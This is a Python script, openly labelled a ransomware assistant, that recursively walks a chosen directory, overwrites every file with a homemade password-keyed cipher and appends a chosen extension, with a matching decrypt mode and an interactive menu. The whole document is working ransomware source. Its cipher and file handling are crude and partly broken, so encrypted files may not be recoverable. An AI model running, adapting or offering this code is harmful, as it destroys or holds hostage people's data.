import os
import sys
import base64

def getListOfFiles(dirName):
    listOfFile = os.listdir(dirName)
    allFiles = list()
    for entry in listOfFile:
        fullPath = os.path.join(dirName, entry)
        if os.path.isdir(fullPath):
            allFiles = allFiles + getListOfFiles(fullPath)
        else:
            allFiles.append(fullPath)                
    return allFiles

def vernan(string, password, mode):
    if len(password) < len(string):
        while len(password) < len(string):
            password = base64.b64encode(password.encode("ascii")).decode("ascii")
    i = 0
    aux = ""
    aux2 = []
    strLen = len(string)

    while i < strLen:
        if mode == "b":
            passw = int(str(ord(password[i])))
            if int(string[i]) < passw:
                string[i] = int(string[i]) + 127
            aux2.append(chr((int(string[i])) - passw))

        else:
            try:
                aux += str(((int(str(ord(string[i]))) + int(str(ord(password[i]))))%127))
                aux += "+"
            except Exception as err:
                "nothing"

        i += 1
    if mode == "b":
        aux2 = "".join(aux2)
        return bytearray.fromhex(aux2)
    else:
        return aux[:-1]

def ransom(passw, ext, path):
    print("Starting to encrypt files...")
    files = getListOfFiles(path)
    thisFile = f"{path}{__file__}"
    i = 0;
    while i < len(files):
        if files[i] != thisFile:
            print(f"Encrypting file {files[i]}...")
            f = open(files[i], "r+b")
            fContent = f.read()
            fContent = fContent.hex()
            if os.path.splitext(files[i])[1]:
                if os.path.splitext(files[i])[1] != f".{ext}":
                    os.rename(f"{files[i][2:]}", f"{files[i][2:]}.{ext}")

            if not os.path.splitext(files[i])[1]:
                if not os.path.exists(f"{files[i][2:]}.{ext}"):
                    os.rename(f"{files[i][2:]}", f"{files[i][2:]}.{ext}")
            f.close()
            try:
                f = open(files[i], "r+")
            except Exception as err:
                f = open(f"{files[i]}.{ext}", "r+")
            f.seek(0)
            f.truncate()
            f.write("".join(vernan(fContent, passw, "f")))
            print(f"File \"{files[i]}\" encrypted.\n")
            f.close()
        i += 1

# I want to separate logic in functions to simplify understanding.
def dransom(passw, ext, path):
    print("Starting to decrypt files...")
    files = getListOfFiles(path)
    thisFile = f"{path}{__file__}"

    i = 0;
    while i < len(files):
        if files[i] != thisFile:
            if os.path.splitext(files[i])[1]:
                if os.path.splitext(files[i])[1] == f".{ext}":
                    os.rename(f"{files[i][2:]}", f"{files[i][2:-(len(ext)+1)]}")
                    files[i] = files[i][:-(len(ext)+1)]
            print(f"Decrypting file {files[i]}...")
            f = open(files[i], "r+")
            fContent = f.read()
            fContent = fContent.split("+")
            if os.path.splitext(files[i])[1]:
                if os.path.splitext(files[i])[1] == f".{ext}":
                    os.rename(f"{files[i][2:]}", f"{files[i][2:-1]}")

            f.close()
            try:
                f = open(files[i], "r+b")
            except Exception as err:
                f = open(f"{files[i]}.{ext}", "r+b")
            f.seek(0)
            f.truncate()
            f.write(vernan(fContent, passw, "b"))
            print(f"File \"{files[i]}\" decrypted.\n")
            f.close()
        i += 1

def cli(recursion):
    passw = "1337"
    ext = "smr"
    path = "./"
    mode = "2"

    if len(sys.argv) > 1 or recursion == "interactive":
        i = 1
        if recursion == "interactive":
            i = 0
        while i < len(sys.argv):
            if sys.argv[i] == '--interactive' or sys.argv[i] == '-i':
                mode = input(f"""Ransomware Assistent:
Write the number matching the option:
0 - Encrypt files.
1 - Decrypt files.
2 - Encrypt & Decrypt files. (only for debug)
€ """)
                ext = input(f"""Chose a string to append to encrypted files as extension.
Example: helloWorld.html -> helloWorld.html.jaja
To follow the example you ONLY write jaja
Your extension name:
€ """)
                path = input(f"""Chose a path to encrypt all files. The subdirectories also get encrypted.
To encrypt current folder and subfolder from where you are running the ransomware use write ./
€ """)
                passw = input(f"""Chose the password to encrypt the files. Can be any size. 
Example: abc123
€ """)
            elif i == 0:
                "first argument. Don't to go else"
            else:
                print(f"""Help menu: """)
                return 0
            i += 1
    if mode == "0":
        ransom(passw, ext, path)
    elif mode == "1":
        dransom(passw, ext, path)
    elif mode == "2":
        ransom(passw, ext, path)
        dransom(passw, ext, path)
    else:
        cli("interactive")

if len(sys.argv) == 1:
    cli("interactive")
else:
    cli("default")
